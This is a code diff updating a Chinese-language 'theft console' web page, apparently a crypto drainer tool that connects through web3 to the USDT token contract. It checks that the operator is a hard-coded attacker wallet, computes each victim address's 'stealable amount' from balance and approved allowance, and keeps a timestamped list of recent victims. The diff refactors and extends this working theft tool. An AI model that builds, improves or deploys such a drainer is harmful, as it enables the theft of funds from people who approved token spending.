@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>盜取控制台 v2.4</title></head>
+<head><meta charset="UTF-8"><title>盜取控制台 v2.6</title></head>
 <body>
 <h2>🛠️ 攻擊者操作介面</h2>
 <div><b>👤 你目前登入帳號：</b><span id="currentAccount" style="color:#007700;"></span></div>
@@ -18,32 +18,7 @@
 <br><br>
 <pre id="log" style="background:#f4f4f4;padding:10px;margin-top:20px;"></pre>
 
-<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js">
-function updateRecent(victim) {
-  if (!victim) return;
-  let list = JSON.parse(localStorage.getItem("victimList") || "[]");
-  if (!list.includes(victim)) {
-    list.unshift(victim);
-    if (list.length > 10) list.pop(); // 最多記錄 10 筆
-    localStorage.setItem("victimList", JSON.stringify(list));
-    renderRecentList();
-  }
-}
-
-function renderRecentList() {
-  let list = JSON.parse(localStorage.getItem("victimList") || "[]");
-  const container = document.getElementById("recentList");
-  container.innerHTML = list.map((addr, i) => `<li>${i+1}. ${addr}</li>`).join("");
-}
-
-function clearHistory() {
-  localStorage.removeItem("victimList");
-  renderRecentList();
-}
-
-window.addEventListener("load", renderRecentList);
-
-</script>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 <script>
 const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
@@ -76,8 +51,6 @@ const abi = [
 ];
 
 let web3, contract, account;
-const logDiv = document.getElementById("log");
-const checkStatus = document.getElementById("checkStatus");
 
 async function init() {
   if (typeof window.ethereum === 'undefined') {
@@ -90,6 +63,7 @@ async function init() {
   account = accounts[0];
   document.getElementById("currentAccount").innerText = account;
   contract = new web3.eth.Contract(abi, tokenAddress);
+  const checkStatus = document.getElementById("checkStatus");
   checkStatus.innerText = account.toLowerCase() === attacker.toLowerCase()
     ? "✅ 你是攻擊者本人"
     : "❌ 非攻擊者帳號，請切換";
@@ -98,7 +72,8 @@ async function init() {
 async function getMax() {
   await init();
   const victim = document.getElementById("victim").value;
-  document.getElementById("statusMsg")?.remove();
+  if (!victim) return log("❌ 請輸入受害者地址");
+
   let balance = "0";
   let allowance = "0";
   try {
@@ -110,8 +85,8 @@ async function getMax() {
   }
   const max = web3.utils.toBN(balance).lt(web3.utils.toBN(allowance)) ? balance : allowance;
   document.getElementById("amount").value = max;
-  log("🟢 受害者：" + victim);
   updateRecent(victim);
+  log("🟢 受害者：" + victim);
   log("✅ 可盜金額：" + max);
 }
 
@@ -136,24 +111,32 @@ async function stealAll() {
 
 function log(msg) {
   console.log(msg);
-  logDiv.innerText += msg + "\n";
+  document.getElementById("log").innerText += msg + "\n";
 }
 
 function updateRecent(victim) {
   if (!victim) return;
   let list = JSON.parse(localStorage.getItem("victimList") || "[]");
-  if (!list.includes(victim)) {
-    list.unshift(victim);
-    if (list.length > 10) list.pop(); // 最多記錄 10 筆
-    localStorage.setItem("victimList", JSON.stringify(list));
-    renderRecentList();
-  }
+  const now = new Date().toLocaleString();
+  const entry = victim + " ⏱️ " + now;
+  list = list.filter(i => !i.startsWith(victim));
+  list.unshift(entry);
+  if (list.length > 10) list.pop();
+  localStorage.setItem("victimList", JSON.stringify(list));
+  renderRecentList();
+  document.getElementById("victim").value = victim;
 }
 
 function renderRecentList() {
   let list = JSON.parse(localStorage.getItem("victimList") || "[]");
   const container = document.getElementById("recentList");
-  container.innerHTML = list.map((addr, i) => `<li>${i+1}. ${addr}</li>`).join("");
+  container.innerHTML = list.map(function(entry, i) {
+    return '<li>' + (i + 1) + '. ' + entry + '</li>';
+  }).join("");
+  if (list.length > 0) {
+    const last = list[0].split(" ")[0];
+    document.getElementById("victim").value = last;
+  }
 }
 
 function clearHistory() {
@@ -162,7 +145,6 @@ function clearHistory() {
 }
 
 window.addEventListener("load", renderRecentList);
-
 </script>
 </body>
 </html>
